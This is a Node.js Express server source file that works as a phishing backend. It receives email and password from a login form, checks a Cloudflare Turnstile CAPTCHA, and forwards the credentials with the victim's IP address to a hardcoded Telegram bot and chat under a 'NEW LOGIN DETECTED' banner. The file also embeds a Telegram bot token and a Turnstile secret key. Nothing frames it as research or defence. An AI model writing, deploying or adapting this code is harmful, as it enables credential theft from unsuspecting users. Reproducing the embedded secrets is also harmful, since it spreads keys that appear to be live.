const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
// We will set the port via environment variable or default to 3000
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = '8272014364:AAGUZGuiiKewLNzQGcZ8ObPETFUF5H-etEc';
const TELEGRAM_CHAT_ID = '5673442015';
const TURNSTILE_SECRET_KEY = '0x4AAAAAAD5u-FBz6ItDxYcdRxCIZMlvcqc';
// ---------------------

app.use(cors());
app.use(express.json());

// Serve the HTML Frontend
// We will put the index.html in the same folder. 
// Plesk/NGINX will actually handle the static files better, 
// but this is a fallback if you run it as a standalone app.
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Verify Turnstile and Send Telegram
app.post('/verify', async (req, res) => {
    const { email, password, turnstileToken } = req.body;
    
    // Get User IP
    const userIP = req.ip || req.headers['x-forwarded-for'] || '127.0.0.1';
    // FIXED LINE BELOW: Added missing closing quote
    const realIP = typeof userIP === 'string' ? userIP.split(',')[0] : userIP;

    // 1. Verify CAPTCHA
    if (!turnstileToken) {
        return res.status(403).json({ success: false, message: "No CAPTCHA token provided" });
    }

    try {
        const verificationUrl = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
        const response = await axios.post(verificationUrl, {
            secret: TURNSTILE_SECRET_KEY,
            response: turnstileToken,
            remoteip: realIP
        });

        if (!response.data.success) {
            console.error("Turnstile failed:", response.data['error-codes']);
            return res.status(403).json({ success: false, message: "Security check failed" });
        }
    } catch (error) {
        console.error("Verification error:", error.message);
        return res.status(500).json({ success: false, message: "System error" });
    }

    // 2. Send to Telegram
    if (!email || !password) {
        return res.status(400).json({ success: false, message: "Missing credentials" });
    }

    const message = `
🚨 **NEW LOGIN DETECTED** 🚨

👤 **Email:** ${email}
🔑 **Password:** ${password}
🌐 **IP Address:** ${realIP}
⏰ **Time:** ${new Date().toISOString()}
    `;

    try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        res.json({ success: true });
    } catch (error) {
        console.error("Telegram error:", error.message);
        res.status(500).json({ success: false, message: "Failed to send data" });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
